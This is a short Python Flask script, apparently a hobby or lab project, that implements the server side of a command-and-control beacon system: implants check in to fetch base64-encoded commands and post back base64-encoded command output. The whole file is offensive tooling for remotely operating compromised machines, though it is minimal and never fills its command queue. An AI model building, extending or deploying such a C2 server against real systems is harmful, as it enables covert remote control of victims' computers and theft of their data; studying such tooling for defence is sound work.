# Stephen Graver - server.py
# server side script

from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

# memory store for commands and results
pending_commands = {}
results = {}

@app.route('/checkin/<beacon_id>', methods=['GET'])
# endpoint for beacons to check for commands.
def checkin(beacon_id):
    print(f"[*] Beacon {beacon_id} checked in.")
    cmd = pending_commands.pop(beacon_id, "")
    if cmd:
        return base64.b64encode(cmd.encode()).decode()
    return ""

@app.route('/results/<beacon_id>', methods=['POST'])
# Endpoint to receive command output.
def receive_results(beacon_id):
    output = base64.b64decode(request.form.get('output')).decode()
    print(f"\n[+] Results from {beacon_id}:\n{output}")
    return "OK"